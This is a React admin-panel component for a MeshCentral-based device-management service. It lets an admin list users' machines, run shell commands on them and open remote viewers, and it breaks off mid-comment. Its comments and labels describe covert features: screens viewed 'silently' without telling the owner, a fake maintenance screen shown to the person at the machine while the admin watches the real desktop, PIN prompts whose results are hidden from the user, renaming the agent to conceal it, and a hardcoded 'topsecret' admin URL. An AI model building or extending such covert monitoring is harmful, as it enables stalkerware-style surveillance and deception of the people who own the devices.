"use client";

import { Fragment, useCallback, useEffect, useState, type MouseEvent } from "react";

import { ScreenMonitorPanel } from "@/components/admin/screen-monitor-panel";
import { useConfirm } from "@/components/confirm-provider";
import { copyToClipboard } from "@/lib/clipboard";

// ---------------------------------------------------------------------------
// TASK_146 — Devices: every machine (or one owner's), then run a command.
//
// Two entry points, ONE read model:
//   • all devices  → GET /api/admin/devices?q=&status=
//   • one owner    → GET /api/admin/users/[id]/devices   (only when pinned)
// Both return the same shape from the same selector, so the status badge here
// can never contradict what the customer's own console shows.
// ---------------------------------------------------------------------------

type AdminDevice = {
  id: string;
  name: string;
  deviceKind: string;
  status: string;
  osName: string | null;
  osVersion: string | null;
  tier: string;
  lastSeenAt: string | null;
  createdAt: string;
  /** TASK_188 S3 — set while the row is soft-deleted (Deleted subtab only). */
  removedAt: string | null;
  agentId: string | null;
  idleSeconds: number | null;
  owner: { id: string; email: string; tier: number };
};

type AdminCommandTarget = {
  deviceId: string;
  name: string | null;
  ownerEmail: string | null;
  ok: boolean;
  output: string | null;
  error: string | null;
};

type AdminCommandLogRow = {
  id: string;
  batchId: string | null;
  deviceId: string;
  // TASK_147/148 — "command" | "remote-control" | "maintenance" |
  // "pin-request" | "agent-visibility".
  kind: string;
  shell: string;
  cmd: string;
  status: string;
  error: string | null;
  output: string | null;
  createdAt: string;
};

// TASK_148 — a PIN collected by the admin tools. `pin` is only present once the
// person at the machine has actually typed it in.
type AdminPinRow = {
  id: string;
  pinLength: number;
  status: string;
  pin: string | null;
  expiresAt: string;
  createdAt: string;
};

/**
 * TASK_148 — how each non-command log entry reads in the admin's history.
 *
 * The log holds five different things now, and printing a maintenance overlay
 * as if it were a typed command would be a lie about what happened. These are
 * the one place that mapping lives.
 */
const ADMIN_LOG_KIND_LABEL: Record<string, string> = {
  "remote-control": "remote control",
  maintenance: "maintenance",
  "pin-request": "PIN request",
  "agent-visibility": "agent visibility",
};

/**
 * What the admin needs to understand about a tool entry AFTER it ran — above
 * all, what the person at the machine could have seen. None of these actions is
 * invisible on the device itself, and the history must not pretend otherwise.
 */
function adminLogKindNote(kind: string): string | null {
  switch (kind) {
    case "remote-control":
      return "Screen viewed silently — the owner was not asked and not told.";
    case "maintenance":
      return "Maintenance screen sent to the machine. It is excluded from remote capture, so you keep watching the real desktop while the person at the device sees the update screen.";
    case "pin-request":
      return "PIN prompt sent to the machine — the person at the keyboard sees it. The request and the PIN stay out of the user's console.";
    case "agent-visibility":
      return "Agent name changed on the machine. Cosmetic only — a local admin can still see, reveal or uninstall it. Nothing appears in the user's activity.";
    default:
      return null;
  }
}

type AdminMeshUrls = {
  hostname: string;
  control: string;
  status?: string;
};

/** The device whose viewer is open, plus the URLs minted for that one session. */
type AdminRemoteSession = {
  deviceId: string;
  deviceName: string;
  ownerEmail: string;
  urls: AdminMeshUrls;
  // TASK_147 — carried into the viewer so it can say whether the machine is
  // actually reporting. Vantra mints a viewer URL even for a machine that is not
  // online (minting is not the same rail as run-command, which refuses with
  // vantra_503), so without this the admin would open a frame that cannot show a
  // live desktop and have no way to tell that from a working session.
  status: string;
  lastSeenAt: string | null;
};

function DeviceStatusBadge({ status }: { status: string }) {
  const online = status === "online";
  return (
    <span
      className={`inline-flex items-center gap-1.5 rounded-full px-2 py-0.5 text-xs font-medium ${
        online
          ? "bg-emerald-100 text-emerald-700 dark:bg-emerald-900/40 dark:text-emerald-400"
          : "bg-zinc-100 text-zinc-600 dark:bg-zinc-800 dark:text-zinc-400"
      }`}
    >
      <span
        className={`h-1.5 w-1.5 rounded-full ${online ? "bg-emerald-500" : "bg-zinc-400 dark:bg-zinc-500"}`}
      />
      {status}
    </span>
  );
}

/** MeshCentral idle seconds → the shortest honest thing an admin can read. */
function formatIdle(seconds: number | null): string {
  if (seconds === null) return "—";
  if (seconds < 60) return `${Math.round(seconds)}s`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return `${minutes}m`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return `${hours}h ${minutes % 60}m`;
  return `${Math.floor(hours / 24)}d`;
}

function formatWhen(iso: string | null): string {
  if (!iso) return "never";
  const date = new Date(iso);
  return Date.now() - date.getTime() < 60_000 ? "just now" : date.toLocaleString();
}

export function DevicesTab({
  owner,
  onOwnerChange,
}: {
  owner: { id: string; email: string } | null;
  onOwnerChange: (owner: { id: string; email: string } | null) => void;
}) {
  const [devices, setDevices] = useState<AdminDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [truncated, setTruncated] = useState(false);
  const [query, setQuery] = useState("");
  const [appliedQuery, setAppliedQuery] = useState("");
  const [status, setStatus] = useState<"all" | "online" | "offline">("all");
  // TASK_188 S3 — Active | Deleted. One segmented control, two reads of the
  // SAME endpoint (`removed=1` flips the where-clause server-side); "deleted"
  // deliberately ignores the owner pin and the status filter.
  const [view, setView] = useState<"active" | "deleted">("active");
  const [selected, setSelected] = useState<string[]>([]);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [logs, setLogs] = useState<Record<string, AdminCommandLogRow[]>>({});
  // TASK_188 S3 — Recover: every user for the picker, the chosen target per
  // row (defaults to the ORIGINAL owner), one in-flight row, one top-level
  // confirmation line.
  const [recoverUsers, setRecoverUsers] = useState<Array<{ id: string; email: string }>>([]);
  const [recoverFor, setRecoverFor] = useState<Record<string, string>>({});
  const [recovering, setRecovering] = useState<string | null>(null);
  const [notice, setNotice] = useState("");
  // TASK_147 — remote control. The viewer is a modal that STAYS MOUNTED while it
  // is open: the MeshCentral URL carries a ONE-TIME login token, so tearing the
  // iframe down and rebuilding it replays a spent token (the exact bug TASK_103
  // NEW-3 fixed in components/device-console.tsx).
  const [remote, setRemote] = useState<AdminRemoteSession | null>(null);
  const [remoteBusy, setRemoteBusy] = useState("");
  const [remoteErr, setRemoteErr] = useState("");
  // TASK_190 S1/S2 — the row's Actions dropdown (a FIXED popover: the table
  // wrapper's overflow-x-auto would clip an absolute menu, and the sticky
  // admin header is z-40, so the menu sits at z-50) and the per-device Screen
  // monitor panel, which renders as its own row below the device's.
  const [actions, setActions] = useState<{ id: string; right: number; top: number } | null>(
    null,
  );
  const [monitorId, setMonitorId] = useState<string | null>(null);

  // TASK_190 S1 — the dropdown closes on ANY outside click and on Escape.
  // Listeners exist only while a menu is open; clicks inside the menu never
  // reach them (the menu stops propagation) — its items close it themselves.
  useEffect(() => {
    if (!actions) return;
    const close = () => setActions(null);
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") setActions(null);
    };
    document.addEventListener("click", close);
    document.addEventListener("keydown", onKey);
    return () => {
      document.removeEventListener("click", close);
      document.removeEventListener("keydown", onKey);
    };
  }, [actions]);

  // TASK_190 S1 — open/toggle the dropdown on the button's screen position.
  // stopPropagation keeps the document closer above from stomping the very
  // click that opens it (switching rows would flash-open then instantly
  // close). The menu height is fixed so it flips above a button near the
  // viewport floor instead of being clipped.
  function toggleActions(e: MouseEvent<HTMLButtonElement>, deviceId: string) {
    e.stopPropagation();
    if (actions?.id === deviceId) {
      setActions(null);
      return;
    }
    const rect = e.currentTarget.getBoundingClientRect();
    const menuHeight = 164;
    const below = rect.bottom + 4;
    setActions({
      id: deviceId,
      right: Math.max(8, window.innerWidth - rect.right),
      top:
        below + menuHeight > window.innerHeight
          ? Math.max(8, rect.top - menuHeight - 4)
          : below,
    });
  }

  const load = useCallback(async () => {
    setLoading(true);
    setError("");
    // A selection that outlived the list it was made from could carry a device id
    // the admin can no longer see into the next bulk run — drop it with the list.
    setSelected([]);
    setExpandedId(null);
    // TASK_190 — an open dropdown/panel must not outlive the list it was
    // opened from (same reasoning as the selection reset above).
    setActions(null);
    setMonitorId(null);
    try {
      const res =
        view === "deleted"
          ? // TASK_188 S3 — the Deleted subtab: SAME endpoint, inverted flag.
            // No owner pin (deleted devices span every owner — that is the
            // point) and no status filter (a removed row's derived status is
            // meaningless next to "removed on …").
            await fetch(
              `/api/admin/devices?${new URLSearchParams({
                removed: "1",
                ...(appliedQuery ? { q: appliedQuery } : {}),
              }).toString()}`,
            )
          : owner
            ? await fetch(`/api/admin/users/${owner.id}/devices`)
            : await fetch(
                `/api/admin/devices?${new URLSearchParams({
                  ...(appliedQuery ? { q: appliedQuery } : {}),
                  ...(status !== "all" ? { status } : {}),
                }).toString()}`,
              );
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        setError(typeof data.error === "string" ? data.error : "Failed to load devices");
        setDevices([]);
      } else {
        setDevices(Array.isArray(data.devices) ? (data.devices as AdminDevice[]) : []);
        setTruncated(data.truncated === true);
      }
      // The Recover picker needs EVERY user: a removed device can belong to
      // anyone, so a premium-filtered list (the only other admin user list,
      // /api/admin/node-access) would hide the target person. Fetched with the
      // rows rather than in its own effect, so it shares the load lifecycle.
      if (view === "deleted") {
        const usersRes = await fetch("/api/admin/users");
        const usersData = await usersRes.json().catch(() => ({}));
        if (usersRes.ok && Array.isArray(usersData.users)) {
          setRecoverUsers(usersData.users as Array<{ id: string; email: string }>);
        }
      }
    } catch {
      setError("Network error");
    } finally {
      setLoading(false);
    }
  }, [owner, appliedQuery, status, view]);

  useEffect(() => {
    void load();
  }, [load]);

  const loadLog = useCallback(async (deviceId: string) => {
    try {
      const res = await fetch(`/api/admin/devices/${deviceId}/run-command`);
      const data = await res.json().catch(() => ({}));
      if (res.ok && Array.isArray(data.commands)) {
        setLogs((prev) => ({ ...prev, [deviceId]: data.commands as AdminCommandLogRow[] }));
      }
    } catch {
      // History is best-effort — it must never block the command box.
    }
  }, []);

  // Expanding a row loads that device's admin-only command log. Done here (in
  // the click) rather than in an effect that watches `expandedId`: the effect
  // would also fire a fetch on every unrelated re-render's identity change.
  function toggleExpanded(deviceId: string) {
    const next = expandedId === deviceId ? null : deviceId;
    setExpandedId(next);
    if (next) void loadLog(next);
  }

  const visibleIds = devices.map((d) => d.id);
  const allSelected = visibleIds.length > 0 && visibleIds.every((id) => selected.includes(id));
  const selectedDevices = devices.filter((d) => selected.includes(d.id));

  function toggleAll() {
    setSelected(allSelected ? [] : visibleIds);
  }

  function toggleOne(id: string) {
    setSelected((prev) => (prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id]));
  }

  function closeRemote() {
    setRemote(null);
    setRemoteErr("");
  }

  // TASK_147 — mint a fresh viewer URL for one device and open the screen.
  //
  // No approval rail and no user signal: the admin session IS the authorization
  // (see the route's comment). A fresh call is required every time because the
  // MeshCentral `login=` token is single-use — the same reason Close is the only
  // way out and why the iframe is never unmounted while open.
  async function openRemote(device: AdminDevice) {
    setRemoteBusy(device.id);
    setRemoteErr("");
    try {
      const res = await fetch(`/api/admin/devices/${device.id}/mesh-urls`);
      const data = await res.json().catch(() => ({}));
      if (!res.ok || !data.urls) {
        throw new Error(
          typeof data.error === "string"
            ? data.error.replace("vantra_503: ", "").replace("vantra_404: ", "")
            : "Couldn't open the viewer",
        );
      }
      setRemote({
        deviceId: device.id,
        deviceName: device.name,
        ownerEmail: device.owner.email,
        urls: data.urls as AdminMeshUrls,
        status: device.status,
        lastSeenAt: device.lastSeenAt,
      });
      // The open just landed in this device's admin-only log; refresh it so the
      // history under the row already shows it when the admin returns.
      void loadLog(device.id);
    } catch (e) {
      setRemote(null);
      setRemoteErr(e instanceof Error ? e.message : "Couldn't open the viewer");
    } finally {
      setRemoteBusy("");
    }
  }

  /**
   * TASK_188 S3 — Recover one deleted device, optionally to a different user.
   *
   * PATCHes the restore route (which writes `removedAt: null` explicitly and
   * validates the target user BEFORE touching anything), then drops the row
   * from this list: it stopped being a deleted device the moment the write
   * landed, so leaving it on screen would be a lie.
   */
  async function recover(device: AdminDevice) {
    const targetUserId = recoverFor[device.id] ?? device.owner.id;
    setRecovering(device.id);
    setNotice("");
    setError("");
    try {
      const res = await fetch(`/api/admin/devices/${device.id}/restore`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: targetUserId }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        setError(typeof data.error === "string" ? data.error : "Recover failed");
        return;
      }
      const ownerEmail =
        data && data.device && data.device.owner && typeof data.device.owner.email === "string"
          ? data.device.owner.email
          : "";
      setDevices((prev) => prev.filter((d) => d.id !== device.id));
      setNotice(`Recovered “${device.name}”${ownerEmail ? ` → ${ownerEmail}` : ""}.`);
    } catch {
      setError("Network error");
    } finally {
      setRecovering(null);
    }
  }


  return (
    <div>
      <div className="flex flex-wrap items-end justify-between gap-3">
        <div>
          <h2 className="text-2xl font-semibold tracking-tight">Devices</h2>
          <p className="mt-1 text-sm text-zinc-500 dark:text-zinc-400">
            {owner
              ? `Every machine owned by ${owner.email}`
              : loading
                ? "Loading devices…"
                : `${devices.length} device${devices.length === 1 ? "" : "s"} across all users`}
            {truncated ? " (showing the first 500 — narrow the search)" : ""}
          </p>
        </div>
        <div className="flex items-center gap-2">
          {/* TASK_188 S3 — Active | Deleted. The only way into the recovered-
              device list; there is no other entry point anywhere in the app. */}
          <div
            className="flex rounded-lg border border-zinc-300 p-0.5 dark:border-zinc-700"
            role="tablist"
            aria-label="Device list view"
          >
            {([["active", "Active"], ["deleted", "Deleted"]] as const).map(([id, label]) => (
              <button
                key={id}
                role="tab"
                aria-selected={view === id}
                onClick={() => setView(id)}
                className={`rounded-md px-3 py-1 text-xs font-medium transition-colors ${
                  view === id
                    ? "bg-zinc-900 text-white dark:bg-zinc-50 dark:text-zinc-900"
                    : "text-zinc-600 hover:bg-zinc-100 dark:text-zinc-400 dark:hover:bg-zinc-800"
                }`}
              >
                {label}
              </button>
            ))}
          </div>
          {owner && (
            <button
              onClick={() => onOwnerChange(null)}
              className="rounded-lg border border-zinc-300 px-3 py-1.5 text-xs font-medium text-zinc-700 transition-colors hover:bg-zinc-100 dark:border-zinc-700 dark:text-zinc-300 dark:hover:bg-zinc-800"
            >
              ← All devices
            </button>
          )}
          <button
            onClick={() => void load()}
            className="rounded-lg border border-zinc-300 px-3 py-1.5 text-xs font-medium text-zinc-700 transition-colors hover:bg-zinc-100 dark:border-zinc-700 dark:text-zinc-300 dark:hover:bg-zinc-800"
          >
            Refresh
          </button>
        </div>
      </div>

      {!owner && (
        <form
          className="mt-4 flex flex-wrap items-center gap-2"
          onSubmit={(e) => {
            e.preventDefault();
            setAppliedQuery(query.trim());
          }}
        >
          <input
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            placeholder="Search by device name or user email…"
            className="w-full max-w-md rounded-lg border border-zinc-300 bg-white px-3 py-1.5 text-sm outline-none focus:border-zinc-500 dark:border-zinc-700 dark:bg-zinc-950"
          />
          <select
            value={status}
            onChange={(e) => setStatus(e.target.value as "all" | "online" | "offline")}
            className="rounded-lg border border-zinc-300 bg-white px-3 py-1.5 text-sm outline-none focus:border-zinc-500 dark:border-zinc-700 dark:bg-zinc-950"
            // A removed row has no meaningful online/offline state to filter
            // on — hiding the control beats showing one that does nothing.
            hidden={view === "deleted"}
          >
            <option value="all">All statuses</option>
            <option value="online">Online only</option>
            <option value="offline">Offline only</option>
          </select>
          <button
            type="submit"
            className="rounded-lg bg-zinc-900 px-3 py-1.5 text-xs font-medium text-white transition-colors hover:bg-zinc-700 dark:bg-zinc-50 dark:text-zinc-900 dark:hover:bg-zinc-300"
          >
            Search
          </button>
        </form>
      )}

      {error && <p className="mt-3 text-sm text-red-600 dark:text-red-400">{error}</p>}

      {/* TASK_188 S3 — one line of proof after a Recover: which device went to
          which user. The row itself has already left the list above. */}
      {notice && <p className="mt-3 text-sm text-emerald-600 dark:text-emerald-400">{notice}</p>}

      {/* TASK_147 — a viewer that failed to open (offline machine, unlinked agent).
          Shown here, above the table, because the modal it belongs to never got
          far enough to render. */}
      {remoteErr && (
        <p className="mt-3 flex items-start justify-between gap-3 text-sm text-red-600 dark:text-red-400">
          <span>{remoteErr}</span>
          <button
            onClick={() => setRemoteErr("")}
            className="shrink-0 text-xs text-zinc-500 underline-offset-4 hover:underline dark:text-zinc-400"
          >
            Dismiss
          </button>
        </p>
      )}

      {selectedDevices.length > 0 && (
        <div className="mt-5">
          <AdminCommandComposer
            title={
              selectedDevices.length === 1
                ? `Run on ${selectedDevices[0].name}`
                : `Run on ${selectedDevices.length} selected devices`
            }
            subtitle={selectedDevices.map((d) => d.owner.email).join(", ")}
            targets={selectedDevices.map((d) => ({
              id: d.id,
              name: d.name,
              ownerEmail: d.owner.email,
            }))}
            onRan={() => {
              if (expandedId) void loadLog(expandedId);
            }}
          />
        </div>
      )}


      {loading ? (
        <p className="mt-6 text-sm text-zinc-500 dark:text-zinc-400">Loading…</p>
      ) : devices.length === 0 ? (
        <p className="mt-6 text-sm text-zinc-500 dark:text-zinc-400">
          {view === "deleted"
            ? "No deleted devices — nothing has been soft-deleted (or everything has been recovered)."
            : owner
              ? "This user has no devices yet."
              : "No devices match."}
        </p>
      ) : (
        <div className="mt-6 overflow-x-auto rounded-xl border border-zinc-200 bg-white shadow-sm dark:border-zinc-800 dark:bg-zinc-900">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-zinc-200 text-left text-xs uppercase tracking-wide text-zinc-500 dark:border-zinc-800 dark:text-zinc-400">
                <th className="px-3 py-3">
                  <input
                    type="checkbox"
                    checked={allSelected}
                    onChange={toggleAll}
                    aria-label="Select all devices on this list"
                  />
                </th>
                <th className="px-4 py-3 font-medium">Device</th>
                <th className="px-4 py-3 font-medium">Owner</th>
                {view === "active" ? (
                  <>
                    <th className="px-4 py-3 font-medium">Status</th>
                    <th className="px-4 py-3 font-medium">Last seen</th>
                    <th className="px-4 py-3 font-medium">Idle</th>
                    <th className="px-4 py-3 font-medium">Agent</th>
                  </>
                ) : (
                  <>
                    <th className="px-4 py-3 font-medium">Deleted</th>
                    <th className="px-4 py-3 font-medium">Recover to</th>
                  </>
                )}
                <th className="px-4 py-3 font-medium" />
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-100 dark:divide-zinc-800">
              {devices.map((device) => (
                <Fragment key={device.id}>
                  <tr className={expandedId === device.id ? "bg-zinc-50 dark:bg-zinc-800/40" : undefined}>
                    <td className="px-3 py-3">
                      <input
                        type="checkbox"
                        checked={selected.includes(device.id)}
                        onChange={() => toggleOne(device.id)}
                        aria-label={`Select ${device.name}`}
                      />
                    </td>
                    <td className="px-4 py-3">
                      <div className="font-medium">{device.name}</div>
                      <div className="text-xs text-zinc-400 dark:text-zinc-500">{device.deviceKind}</div>
                    </td>
                    <td className="px-4 py-3">
                      <button
                        onClick={() => onOwnerChange({ id: device.owner.id, email: device.owner.email })}
                        className="text-left text-zinc-600 underline-offset-4 hover:underline dark:text-zinc-300"
                        title="Show every device this owner has"
                      >
                        {device.owner.email}
                      </button>
                    </td>
                    {view === "active" ? (
                      <>
                        <td className="px-4 py-3">
                          <DeviceStatusBadge status={device.status} />
                        </td>
                        <td className="px-4 py-3 text-zinc-500 dark:text-zinc-400">
                          {formatWhen(device.lastSeenAt)}
                        </td>
                        <td className="px-4 py-3 text-zinc-500 dark:text-zinc-400">
                          {formatIdle(device.idleSeconds)}
                        </td>
                        <td className="px-4 py-3 font-mono text-xs text-zinc-400 dark:text-zinc-500">
                          {device.agentId ?? "not linked"}
                        </td>
                      </>
                    ) : (
                      <>
                        <td className="px-4 py-3 text-zinc-500 dark:text-zinc-400">
                          {device.removedAt ? new Date(device.removedAt).toLocaleString() : "—"}
                        </td>
                        {/* TASK_188 S3 — "recover to any user I choose": the
                            picker defaults to the ORIGINAL owner (the safe
                            answer) and only changes when a person is picked. */}
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <select
                              value={recoverFor[device.id] ?? device.owner.id}
                              onChange={(e) =>
                                setRecoverFor((prev) => ({ ...prev, [device.id]: e.target.value }))
                              }
                              aria-label={`Recover ${device.name} to a user`}
                              className="rounded-lg border border-zinc-300 bg-white px-2 py-1 text-xs outline-none focus:border-zinc-500 dark:border-zinc-700 dark:bg-zinc-950"
                            >
                              {(recoverUsers.length > 0
                                ? recoverUsers
                                : [{ id: device.owner.id, email: device.owner.email }]
                              ).map((u) => (
                                <option key={u.id} value={u.id}>
                                  {u.id === device.owner.id ? `${u.email} (current owner)` : u.email}
                                </option>
                              ))}
                            </select>
                            <button
                              onClick={() => void recover(device)}
                              disabled={recovering === device.id}
                              className="rounded-lg bg-zinc-900 px-3 py-1 text-xs font-medium text-white transition-colors hover:bg-zinc-700 disabled:opacity-50 dark:bg-zinc-50 dark:text-zinc-900 dark:hover:bg-zinc-300"
                            >
                              {recovering === device.id ? "Recovering…" : "Recover"}
                            </button>
                          </div>
                        </td>
                      </>
                    )}
                    {/* TASK_190 S1 — on the active view the row's former Remote
                        control button (which IS the silent viewer — the S1
                        ground-truth correction) becomes the Actions ▾ menu and the
                        viewer moves to its first item; the Deleted view keeps the
                        plain button byte-for-byte (TASK_188 S3c: deleted rows
                        deliberately retain the tools that work on soft-deleted
                        ids). Command is unchanged for both. */}
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        {view === "active" ? (
                          <button
                            onClick={(e) => toggleActions(e, device.id)}
                            aria-haspopup="menu"
                            aria-expanded={actions?.id === device.id}
                            className="rounded-lg border border-zinc-300 px-3 py-1 text-xs font-medium text-zinc-700 transition-colors hover:bg-zinc-100 dark:border-zinc-700 dark:text-zinc-300 dark:hover:bg-zinc-800"
                            title="Open this machine's actions"
                          >
                            Actions ▾
                          </button>
                        ) : (
                          <button
                            onClick={() => void openRemote(device)}
                            disabled={remoteBusy === device.id}
                            className="rounded-lg border border-zinc-300 px-3 py-1 text-xs font-medium text-zinc-700 transition-colors hover:bg-zinc-100 disabled:opacity-50 dark:border-zinc-700 dark:text-zinc-300 dark:hover:bg-zinc-800"
                            title="Open this machine's screen silently — the owner is not asked and not told"
                          >
                            {remoteBusy === device.id ? "Opening…" : "Remote control"}
                          </button>
                        )}
                        <button
                          onClick={() => toggleExpanded(device.id)}
                          className="rounded-lg border border-zinc-300 px-3 py-1 text-xs font-medium text-zinc-700 transition-colors hover:bg-zinc-100 dark:border-zinc-700 dark:text-zinc-300 dark:hover:bg-zinc-800"
                        >
                          {expandedId === device.id ? "Close" : "Command"}
                        </button>
                      </div>
                      {view === "active" && actions?.id === device.id && (
                        <div
                          role="menu"
                          aria-label={`Actions for ${device.name}`}
                          className="fixed z-50 w-44 rounded-xl border border-zinc-200 bg-white py-1 shadow-lg dark:border-zinc-700 dark:bg-zinc-900"
                          style={{ right: actions.right, top: actions.top }}
                          onClick={(e) => e.stopPropagation()}
                        >
                          {/* Item 1 — the former direct Remote control button (the
                              silent viewer), first so the swap costs nothing. */}
                          <button
                            type="button"
                            role="menuitem"
                            onClick={() => {
                              setActions(null);
                              void openRemote(device);
                            }}
                            disabled={remoteBusy === device.id}
                            className="block w-full px-3 py-1.5 text-left text-xs text-zinc-700 transition-colors hover:bg-zinc-100 disabled:opacity-50 dark:text-zinc-300 dark:hover:bg-zinc-800"
                          >
                            {remoteBusy === device.id ? "Opening…" : "Remote control"}
                          </button>
                          {/* Item 2 — TASK_190 S2: inline Screen monitor panel. */}
                          <button
                            type="button"
                            role="menuitem"
                            onClick={() => {
                              setActions(null);
                              setMonitorId((prev) => (prev === device.id ? null : device.id));
                            }}
                            className="block w-full px-3 py-1.5 text-left text-xs text-zinc-700 transition-colors hover:bg-zinc-100 dark:text-zinc-300 dark:hover:bg-zinc-800"
                          >
                            Screen monitor…
                          </button>
                          {/* Item 3 — TASK_190 S1: console deep link, own tab. The URL
                              lives ONLY here — this file is admin-session-only and
                              never linked from the dashboard, so the secrecy rules
                              hold (no other file may reference either URL). */}
                          <button
                            type="button"
                            role="menuitem"
                            onClick={() => {
                              setActions(null);
                              window.open(
                                `/admin=topsecret6199/device/${device.id}`,
                                "_blank",
                                "noopener",
                              );
                            }}
                            className="block w-full px-3 py-1.5 text-left text-xs text-zinc-700 transition-colors hover:bg-zinc-100 dark:text-zinc-300 dark:hover:bg-zinc-800"
                          >
                            Open console
                          </button>
                        </div>
                      )}
                    </td>
                  </tr>
                  {expandedId === device.id && (
                    <tr className="bg-zinc-50 dark:bg-zinc-800/40">
                      <td colSpan={view === "deleted" ? 6 : 8} className="px-4 py-4">
                        <dl className="grid grid-cols-2 gap-x-6 gap-y-2 text-xs sm:grid-cols-4">
                          <div>
                            <dt className="uppercase tracking-wide text-zinc-400 dark:text-zinc-500">OS</dt>
                            <dd className="text-zinc-700 dark:text-zinc-200">
                              {[device.osName, device.osVersion].filter(Boolean).join(" ") || "unknown"}
                            </dd>
                          </div>
                          <div>
                            <dt className="uppercase tracking-wide text-zinc-400 dark:text-zinc-500">Visibility</dt>
                            <dd className="text-zinc-700 dark:text-zinc-200">{device.tier}</dd>
                          </div>
                          <div>
                            <dt className="uppercase tracking-wide text-zinc-400 dark:text-zinc-500">Owner tier</dt>
                            <dd className="text-zinc-700 dark:text-zinc-200">{device.owner.tier}</dd>
                          </div>
                          <div>
                            <dt className="uppercase tracking-wide text-zinc-400 dark:text-zinc-500">Added</dt>
                            <dd className="text-zinc-700 dark:text-zinc-200">
                              {new Date(device.createdAt).toLocaleDateString()}
                            </dd>
                          </div>
                        </dl>

                        <div className="mt-4">
                          <AdminCommandComposer
                            title={`Run on ${device.name}`}
                            subtitle={device.owner.email}
                            targets={[
                              { id: device.id, name: device.name, ownerEmail: device.owner.email },
                            ]}
                            onRan={() => void loadLog(device.id)}
                          />
                        </div>

                        <div className="mt-4">
                          <p className="text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">
                            Admin command history — not visible to the user
                          </p>
                          {(logs[device.id]?.length ?? 0) === 0 ? (
                            <p className="mt-2 text-xs text-zinc-400 dark:text-zinc-500">
                              No commands run from the admin panel yet.
                            </p>
                          ) : (
                            <ul className="mt-2 space-y-2">
                              {logs[device.id].map((row) => (
                                <li
                                  key={row.id}
                                  className="rounded-lg border border-zinc-200 bg-white px-3 py-2 text-xs dark:border-zinc-800 dark:bg-zinc-900"
                                >
                                  <div className="flex items-center gap-2">
                                    <span
                                      className={
                                        row.status === "ok"
                                          ? "font-medium text-emerald-600 dark:text-emerald-400"
                                          : "font-medium text-red-600 dark:text-red-400"
                                      }
                                    >
                                      {row.status}
                                    </span>
                                    {/* TASK_147/148 — the same log holds commands AND
                                        tool calls (viewer opens, maintenance, PIN
                                        collects, agent visibility), so say which one
                                        this is rather than printing `maintenance` as
                                        if it were a command someone typed. */}
                                    {ADMIN_LOG_KIND_LABEL[row.kind] && (
                                      <span className="rounded-full bg-amber-100 px-2 py-0.5 text-[10px] font-medium uppercase tracking-wide text-amber-700 dark:bg-amber-900/40 dark:text-amber-400">
                                        {ADMIN_LOG_KIND_LABEL[row.kind]}
                                      </span>
                                    )}
                                    <span className="text-zinc-400 dark:text-zinc-500">
                                      {new Date(row.createdAt).toLocaleString()}
                                    </span>
                                    <span className="text-zinc-400 dark:text-zinc-500">{row.shell}</span>
                                  </div>
                                  {adminLogKindNote(row.kind) !== null ? (
                                    <>
                                      <p className="mt-1 text-zinc-500 dark:text-zinc-400">
                                        {adminLogKindNote(row.kind)}
                                      </p>
                                      {/* The tool label ("maintenance-screen",
                                          "pin-request (6)") plus whatever the
                                          machine printed back — for hide/reveal
                                          that is the STEP: lines, which are the
                                          only proof the rename landed. */}
                                      <p className="mt-1 font-mono text-[11px] text-zinc-500 dark:text-zinc-400">
                                        {row.cmd}
                                      </p>
                                      {row.output && (
                                        <pre className="mt-1 whitespace-pre-wrap break-all font-mono text-[11px] text-zinc-600 dark:text-zinc-300">
                                          {row.output}
                                        </pre>
                                      )}
                                    </>
                                  ) : (
                                    <pre className="mt-1 whitespace-pre-wrap break-all font-mono text-zinc-700 dark:text-zinc-200">
                                      {row.cmd}
                                    </pre>
                                  )}
                                  {row.error && (
                                    <p className="mt-1 text-red-600 dark:text-red-400">{row.error}</p>
                                  )}
                                </li>
                              ))}
                            </ul>
                          )}
                        </div>
                      </td>
                    </tr>
                  )}
                  {/* TASK_190 S2 — the Screen monitor panel opens as its own row
                      right below the device's (the expanded-row pattern), active
                      view only so it can never render under a Deleted row. */}
                  {monitorId === device.id && view === "active" && (
                    <tr className="bg-zinc-50 dark:bg-zinc-800/40">
                      <td colSpan={8} className="px-4 py-4">
                        <ScreenMonitorPanel
                          deviceId={device.id}
                          onClose={() => setMonitorId(null)}
                        />
                      </td>
                    </tr>
                  )}
                </Fragment>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* TASK_147 — mounted only while a session is open. Kept LAST in the tree
          and rendered from state that `openRemote` set once, so it is never
          re-created (and the single-use login token never replayed) while the
          admin is looking at the screen. */}
      {remote && <AdminRemoteViewer session={remote} onClose={closeRemote} />}
    </div>
  );
}


// TASK_148 — one row in the viewer's Tools menu. Same interaction as the
// customer console's ToolboxItem, restyled for the dark viewer chrome.
function AdminToolItem({
  onClick,
  disabled,
  title,
  label,
  danger,
}: {
  onClick: () => void;
  disabled?: boolean;
  title: string;
  label: string;
  danger?: boolean;
}) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      title={title}
      className={`flex w-full items-center gap-2 rounded-md px-2 py-1.5 text-left text-xs transition-colors disabled:opacity-50 ${
        danger
          ? "text-red-400 hover:bg-red-500/10"
          : "text-zinc-200 hover:bg-white/10"
      }`}
    >
      {label}
    </button>
  );
}

// TASK_147 — the silent remote-control viewer.
//
// Deliberately NOT reusing the customer's viewer chrome (components/device-console.tsx):
// that one is built around the owner's own session toolbar (maintenance, PIN
// collect, disconnect) which an admin looking at a reported user's machine must
// not have. This is a bare, read-first frame plus the one thing an admin needs to
// know — that nobody was told.
//
// The iframe is never conditionally re-keyed and the component is only ever
// mounted/unmounted as a whole: MeshCentral's `login=` token is single-use, so a
